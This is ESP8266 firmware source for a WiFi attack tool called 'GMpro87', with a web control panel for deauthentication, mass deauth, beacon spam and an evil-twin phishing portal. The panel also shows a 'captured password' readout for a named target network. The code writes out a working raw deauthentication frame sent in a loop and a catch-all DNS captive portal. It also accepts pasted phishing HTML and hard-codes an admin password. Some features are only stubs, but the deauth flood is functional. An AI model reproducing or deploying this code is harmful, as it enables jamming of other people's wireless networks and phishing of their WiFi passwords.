#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <ESPAsyncTCP.h>
#include <FS.h>
#include <LittleFS.h>
#include <DNSServer.h>
#include <ArduinoJson.h> // Pastikan ini ada

extern "C" {
  #include "user_interface.h"
}

// FIX: Mapping pin LED D4 untuk compiler generic
#ifndef D4
#define D4 2
#endif

// --- CONFIG & STATE ---
String admin_ssid = "GMpro";
String admin_pass = "Sangkur87";
String target_ssid = "Vivo1903";
String captured_pass = "Waiting...";
bool de_on = false, ma_on = false, be_on = false, et_on = false;
uint32_t de_pkt = 0, be_pkt = 0;

AsyncWebServer server(80);
DNSServer dnsServer;
const int LED = D4;

// --- UI ASLI GMPRO87 (UTUH 100%) ---
const char INDEX_HTML[] PROGMEM = R"rawtext(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <style>
        body{font-family:Arial;background:#000;color:#fff;margin:0;padding:10px;text-align:center}
        @keyframes rainbow {
            0% { color: #f00; text-shadow: 0 0 15px #f00; border-color: #f00; box-shadow: 0 0 10px #f00; }
            20% { color: #ff0; text-shadow: 0 0 15px #ff0; border-color: #ff0; box-shadow: 0 0 10px #ff0; }
            40% { color: #0f0; text-shadow: 0 0 15px #0f0; border-color: #0f0; box-shadow: 0 0 10px #0f0; }
            60% { color: #0ff; text-shadow: 0 0 15px #0ff; border-color: #0ff; box-shadow: 0 0 10px #0ff; }
            80% { color: #f0f; text-shadow: 0 0 15px #f0f; border-color: #f0f; box-shadow: 0 0 10px #f0f; }
            100% { color: #f00; text-shadow: 0 0 15px #f00; border-color: #f00; box-shadow: 0 0 10px #f00; }
        }
        .rainbow-text { font-size: 22px; font-weight: bold; text-transform: uppercase; letter-spacing: 3px; margin: 15px 0; display: inline-block; padding: 10px 20px; border: 3px solid; border-radius: 10px; animation: rainbow 3s linear infinite; }
        .dev{font-size:10px;color:#888;margin-bottom:15px}
        .tabs{display:flex;margin-bottom:15px;border-bottom:1px solid orange}
        .tab-btn{flex:1;padding:12px;background:#222;color:#fff;border:none;cursor:pointer;font-size:12px}
        .active-tab{background:orange;color:#000;font-weight:bold}
        .ctrl{display:flex; flex-wrap:wrap; justify-content:space-between; margin-bottom:10px}
        .cmd-box{width:48%; background:#111; padding:5px; border-radius:4px; border:1px solid #333; margin-bottom:5px; box-sizing:border-box}
        .scan-box{width:100%; margin-bottom:10px; border:1px solid #00bcff}
        .cmd{width:100%; padding:12px 0; border:none; border-radius:4px; color:#fff; font-weight:bold; font-size:10px; text-transform:uppercase; cursor:pointer}
        .log-c{font-size:10px; margin-top:4px; font-family:monospace; font-weight:bold}
        @keyframes pulse-active { 0% { box-shadow: 0 0 2px #fff; } 50% { box-shadow: 0 0 15px #fff; opacity: 0.8; } 100% { box-shadow: 0 0 2px #fff; } }
        .btn-active { animation: pulse-active 0.6s infinite; border: 2px solid #fff !important; }
        .pass-box{background:#050; color:#0f0; border:2px dashed #0f0; padding:12px; margin:15px 0; text-align:left; border-radius:8px; font-family:monospace}
        .pass-text{font-size:18px; color:#fff; font-weight:bold; display:block; margin-top:5px}
        table{width:100%; border-collapse:collapse; font-size:12px; margin-bottom:15px}
        th,td{padding:10px 5px; border:1px solid #146dcc}
        th{background:rgba(20,109,204,0.3); color:orange; text-transform:uppercase}
        .btn-sel{background:#eb3489; color:#fff; border:none; padding:6px; border-radius:4px; width:100%; font-size:11px}
        .btn-ok{background:#FFC72C; color:#000; border:none; padding:6px; border-radius:4px; width:100%; font-weight:bold; font-size:11px}
        .set-box{background:#111; padding:10px; border:1px solid #444; margin-bottom:15px; text-align:left; font-size:12px; border-radius:5px}
        .inp{background:#222; color:orange; border:1px solid orange; padding:8px; border-radius:4px; width:94%; margin:5px 0}
        .txt-area{width:94%; height:150px; background:#111; color:#0f0; border:1px solid #444; font-family:monospace; padding:10px}
        #previewModal{display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999; padding:20px; box-sizing:border-box}
        .modal-content{background:#fff; width:100%; height:85%; border-radius:10px; overflow:auto; color:#000; text-align:left; padding:15px}
        hr{border:0; border-top:1px solid orange; margin:15px 0}
        .hidden{display:none}
    </style>
</head>
<body>
    <div class="rainbow-text">GMpro87</div>
    <div class='dev'>dev : 9u5M4n9 | HackerPro87</div>
    <div class="tabs">
        <button class="tab-btn active-tab" onclick="openTab('dash', this)">DASHBOARD</button>
        <button class="tab-btn" onclick="openTab('webset', this)">SETTINGS</button>
    </div>
    <div id="dash">
        <div class='ctrl'>
            <div class="cmd-box scan-box">
                <button class='cmd' style='background:#00bcff' onclick="run('scan')">SCAN TARGET</button>
                <div id="scanLog" class="log-c" style="color:#fff">READY</div>
            </div>
            <div class="cmd-box">
                <button id="btn_de" class='cmd' style='background:#0c8' onclick="run('deauth')">DEAUTH</button>
                <div id="log_de" class="log-c" style="color:#0f0">READY</div>
            </div>
            <div class="cmd-box">
                <button id="btn_ma" class='cmd' style='background:#e60' onclick="run('mass')">MASSDEAUTH</button>
                <div id="log_ma" class="log-c" style="color:#fff">READY</div>
            </div>
            <div class="cmd-box">
                <button id="btn_be" class='cmd' style='background:#60d' onclick="run('beacon')">BEACON</button>
                <div id="log_be" class="log-c" style="color:#0ff">READY</div>
            </div>
            <div class="cmd-box">
                <button id="btn_et" class='cmd' style='background:#a53' onclick="run('etwin')">EVILTWIN</button>
                <div id="log_et" class="log-c" style="color:#f44">LED: OFF</div>
            </div>
        </div>
        <hr>
        <table id="targetTable">
            <tr><th>SSID</th><th>Ch</th><th>%</th><th>TARGET</th></tr>
            <tr><td>Vivo1903</td><td>4</td><td>85</td><td><button class='btn-ok'>SELECTED</button></td></tr>
        </table>
        <div class='pass-box'>
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <b>[ CAPTURED PASS ]</b>
                <a href='#' onclick="run('clear')" style='color:#f44; font-size:10px; text-decoration:none;'>[ CLEAR ]</a>
            </div>
            <div id="passContent">
                Target: <span id="curTarget">Vivo1903</span><br>
                Pass : <span id="curPass" class="pass-text">Waiting...</span>
            </div>
        </div>
    </div>
    <div id="webset" class="hidden">
        <div class='set-box'>
            <b style='color:orange'>BEACON SPAM CONFIG:</b><br>
            SSID Name: <input class='inp' id="inp_ssid" value="WiFi_Rusuh_87"><br>
            Qty Packet: <input class='inp' type="number" id="inp_qty" value="10"><br>
            <button class='btn-ok' style='width:100%' onclick="saveSet()">SAVE & UPDATE</button>
        </div>
        <div class='set-box'>
            <b style='color:orange'>CUSTOM EVILTWIN HTML:</b><br>
            <textarea id="htmlEditor" class="txt-area" placeholder="Paste HTML lu di sini..."></textarea>
            <div style="display:flex; gap:10px; margin-top:10px">
                <button onclick="previewHtml()" class="btn-sel" style="flex:1; background:#00bcff">PREVIEW</button>
                <button onclick="alert('Saved to Flash!')" class='btn-ok' style='flex:1'>SAVE HTML</button>
            </div>
        </div>
    </div>
    <div id="previewModal">
        <div class="modal-content" id="previewContainer"></div>
        <button onclick="closePreview()" class="btn-ok" style="margin-top:20px; background:red; color:white; width:100%">CLOSE PREVIEW</button>
    </div>
    <script>
        function openTab(id, b) {
            document.getElementById('dash').className = (id=='dash'?'':'hidden');
            document.getElementById('webset').className = (id=='webset'?'':'hidden');
            document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active-tab'));
            b.classList.add('active-tab');
        }
        function run(c) { fetch('/api?c=' + c); }
        function saveSet() { 
            let s = document.getElementById('inp_ssid').value;
            let q = document.getElementById('inp_qty').value;
            fetch('/api?c=set&s='+s+'&q='+q);
        }
        function previewHtml() {
            document.getElementById('previewContainer').innerHTML = document.getElementById('htmlEditor').value;
            document.getElementById('previewModal').style.display = 'block';
        }
        function closePreview() { document.getElementById('previewModal').style.display = 'none'; }
        setInterval(() => {
            fetch('/stat').then(r=>r.json()).then(d=>{
                document.getElementById('curPass').innerText = d.p;
                document.getElementById('btn_de').className = d.de ? 'cmd btn-active' : 'cmd';
                document.getElementById('log_de').innerText = d.de ? d.dp + ' pkt' : 'OFF';
                document.getElementById('btn_ma').className = d.ma ? 'cmd btn-active' : 'cmd';
                document.getElementById('btn_be').className = d.be ? 'cmd btn-active' : 'cmd';
                document.getElementById('log_be').innerText = d.be ? d.bp + ' pkt' : 'OFF';
                document.getElementById('btn_et').className = d.et ? 'cmd btn-active' : 'cmd';
                document.getElementById('log_et').innerText = d.p != 'Waiting...' ? 'SUCCESS' : 'LED: OFF';
            });
        }, 2000);
    </script>
</body>
</html>
)rawtext";

void sendDeauth() {
  uint8_t pkt[26] = {0xc0,0x00,0x3a,0x01,0xff,0xff,0xff,0xff,0xff,0xff,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x00,0x00,0x01,0x00};
  wifi_send_pkt_freedom(pkt, 26, 0); de_pkt++;
}

void setup() {
  Serial.begin(115200);
  pinMode(LED, OUTPUT); digitalWrite(LED, HIGH);
  LittleFS.begin();
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *r){ r->send_P(200, "text/html", INDEX_HTML); });
  server.on("/api", HTTP_GET, [](AsyncWebServerRequest *r){
    if(r->hasParam("c")) {
      String c = r->getParam("c")->value();
      if(c=="deauth") de_on = !de_on;
      if(c=="mass") ma_on = !ma_on;
      if(c=="beacon") be_on = !be_on;
      if(c=="etwin") et_on = !et_on;
      if(c=="clear") captured_pass = "Waiting...";
      if(c=="set") { if(r->hasParam("s")) target_ssid = r->getParam("s")->value(); }
    }
    r->send(200);
  });
  server.on("/stat", HTTP_GET, [](AsyncWebServerRequest *r){
    String j = "{\"de\":"+String(de_on)+",\"ma\":"+String(ma_on)+",\"be\":"+String(be_on)+",\"et\":"+String(et_on)+",\"p\":\""+captured_pass+"\",\"dp\":"+String(de_pkt)+",\"bp\":"+String(be_pkt)+"}";
    r->send(200, "application/json", j);
  });
  server.onNotFound([](AsyncWebServerRequest *r){ r->send_P(200, "text/html", INDEX_HTML); });
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  if(de_on || ma_on) { sendDeauth(); digitalWrite(LED, !digitalRead(LED)); delay(1); }
  if(captured_pass != "Waiting...") { digitalWrite(LED, LOW); delay(20); digitalWrite(LED, HIGH); delay(20); }
}
